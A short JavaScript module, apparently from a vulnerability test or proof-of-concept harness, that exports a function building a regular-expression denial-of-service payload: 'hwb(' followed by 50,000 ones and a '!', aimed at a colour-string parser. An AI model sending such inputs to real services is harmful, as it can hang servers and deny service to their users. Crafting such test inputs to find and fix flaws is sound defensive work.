function getPayload() {
    let attack_str = "hwb(" + "1".repeat(50000) + "!";
    return { attack_str };
}

module.exports = { getPayload };